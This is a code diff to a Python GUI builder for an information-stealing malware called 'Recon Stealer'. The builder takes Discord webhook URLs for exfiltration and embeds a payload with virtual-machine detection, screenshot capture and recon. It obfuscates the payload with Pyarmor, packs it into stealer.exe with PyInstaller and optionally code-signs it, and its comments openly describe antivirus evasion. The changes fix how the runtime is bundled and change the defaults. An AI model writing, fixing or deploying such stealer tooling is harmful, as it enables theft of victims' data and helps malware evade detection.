@@ -6,15 +6,14 @@ import sys
 import subprocess
 import tkinter as tk
 from tkinter import messagebox, ttk
-import re
 import shutil
 import tempfile
 import textwrap
 import requests
-import uuid
 import platform
 import winreg
-import random  # Added for random delays/names
+import random
+import glob  # For recursive runtime bundling
 
 # =================== WEBHOOK TEST ===================
 def test_webhook(hook):
@@ -30,8 +29,8 @@ def test_webhook(hook):
 # =================== GUI ===================
 def get_webhook():
     root = tk.Tk()
-    root.title("Recon Stealer Builder - Nuclear Edition")
-    root.geometry("700x450")
+    root.title("Recon Stealer Builder - Fixed Runtime Edition")
+    root.geometry("700x480")
     root.resizable(False, False)
 
     tk.Label(root, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
@@ -46,11 +45,11 @@ def get_webhook():
     pass_entry = tk.Entry(root, width=90, show="*")
     pass_entry.pack(pady=5)
 
-    tk.Label(root, text="Pyarmor Mode (0=normal, 1=advanced, 2=super/RFT if licensed):", font=("Arial", 9)).pack(pady=10)
-    mode_var = tk.IntVar(value=1)
-    tk.Radiobutton(root, text="0 - Basic", variable=mode_var, value=0).pack()
-    tk.Radiobutton(root, text="1 - Advanced (default)", variable=mode_var, value=1).pack()
-    tk.Radiobutton(root, text="2 - Super Mode (RFT)", variable=mode_var, value=2).pack()
+    tk.Label(root, text="Pyarmor Mode:", font=("Arial", 10, "bold")).pack(pady=10)
+    mode_var = tk.IntVar(value=0)  # Default to basic to avoid license errors
+    tk.Radiobutton(root, text="0 - Basic (works on free/trial)", variable=mode_var, value=0).pack()
+    tk.Radiobutton(root, text="1 - Advanced (--advanced 2 + mix-str) - needs Basic+ license", variable=mode_var, value=1).pack()
+    tk.Radiobutton(root, text="2 - Super RFT Mode (--enable-rft) - needs Pro license", variable=mode_var, value=2).pack()
 
     def run_test():
         hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
@@ -85,17 +84,17 @@ def get_webhook():
             generate_malware(webhooks, pfx_path, pfx_pass, mode)
             progress.stop()
             progress.pack_forget()
-            messagebox.showinfo("Built", "stealer.exe ready.\nObfuscated with pyarmor gen, screenshot + multi-exfil.\nHarder AV evasion.")
+            messagebox.showinfo("Built", "stealer.exe ready.\nRuntime extraction fixed, screenshot + recon + multi-exfil.\nUse mode 0 if license errors.")
         except Exception as e:
             progress.stop()
             progress.pack_forget()
-            messagebox.showerror("Error", str(e))
+            messagebox.showerror("Error", f"{str(e)}\n\nCheck console for full traceback.")
         root.destroy()
 
     tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
     root.mainloop()
 
-# =================== STEALER CODE (unchanged from last) ===================
+# =================== STEALER CODE (same as before) ===================
 stealer_code = textwrap.dedent('''
 import os
 import sys
@@ -117,6 +116,7 @@ except:
     HAS_PYAUTO = False
 
 def is_vm():
+    # [same VM checks as last version]
     try:
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
         val = winreg.QueryValueEx(key, "0")[0].lower()
@@ -239,35 +239,46 @@ Local IP      : {get_local_ip()}
 exfil({WEBHOOK_PLACEHOLDER})
 ''')
 
-# =================== BUILD ===================
-def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=1):
+# =================== BUILD (fixed runtime bundling) ===================
+def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
     if not shutil.which("pyarmor"):
-        raise Exception("pyarmor not found. pip install pyarmor")
+        raise Exception("pyarmor not installed - pip install pyarmor")
 
     temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
     script = os.path.join(temp_dir, "recon.py")
-
     hook_str = repr(webhooks)
     with open(script, "w", encoding="utf-8") as f:
         f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", hook_str))
 
     obf_dir = os.path.join(temp_dir, "obf")
 
-    # Modern pyarmor gen command
     gen_cmd = ["pyarmor", "gen", "-O", obf_dir]
     if mode == 1:
         gen_cmd += ["--advanced", "2", "--mix-str"]
     elif mode == 2:
-        gen_cmd += ["--enable-rft"]  # Super mode - needs pro license
+        gen_cmd += ["--enable-rft"]
     gen_cmd += [script]
 
     result = subprocess.run(gen_cmd, cwd=temp_dir, capture_output=True, text=True)
     if result.returncode != 0:
-        raise Exception(f"Pyarmor gen failed:\n{result.stderr}\n{result.stdout}")
+        raise Exception(f"Pyarmor failed (likely license issue for mode {mode}):\n{result.stdout}\n{result.stderr}")
 
     obf_script = os.path.join(obf_dir, "recon.py")
 
-    # PyInstaller on obfuscated output
+    # Find the runtime package folder
+    runtime_packages = glob.glob(os.path.join(obf_dir, "pyarmor_runtime_*"))
+    if not runtime_packages:
+        raise Exception("Pyarmor runtime package not generated - wtf?")
+    runtime_path = runtime_packages[0]
+
+    # Build pyinstaller add-data args for EVERY file in runtime (recursive)
+    add_data_args = []
+    for root, _, files in os.walk(runtime_path):
+        for file in files:
+            full_path = os.path.join(root, file)
+            rel_path = os.path.relpath(full_path, obf_dir)
+            add_data_args += ["--add-data", f"{full_path}{os.pathsep}{rel_path}"]
+
     cmd = [
         "pyinstaller",
         "--onefile",
@@ -277,9 +288,7 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=1):
         "--hidden-import=winreg",
         "--hidden-import=pyautogui",
         "--hidden-import=requests",
-        "--add-data", f"{obf_dir}{os.pathsep}pyarmor_runtime*",  # Runtime package
-        obf_script
-    ]
+    ] + add_data_args + [obf_script]
 
     result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
     if result.returncode != 0:
@@ -289,7 +298,6 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=1):
     final = os.path.join(os.getcwd(), "stealer.exe")
     shutil.copyfile(exe, final)
 
-    # Signing
     if pfx_path and os.path.exists(pfx_path):
         sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256"]
         if pfx_pass:
@@ -297,12 +305,15 @@ def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=1):
         sign_cmd += [final]
         sign_result = subprocess.run(sign_cmd, capture_output=True, text=True)
         if sign_result.returncode != 0:
-            print(f"Signing failed (non-fatal):\n{sign_result.stderr}")
+            print(f"Signing failed:\n{sign_result.stderr}")
         else:
-            print("EXE signed.")
+            print("Signed.")
 
     shutil.rmtree(temp_dir, ignore_errors=True)
-    print(f"Nuclear stealer built: {final}")
+    print(f"Fixed stealer built: {final}")
+
+if __name__ == "__main__":
+    get_webhook()
 
 if __name__ == "__main__":
     get_webhook()
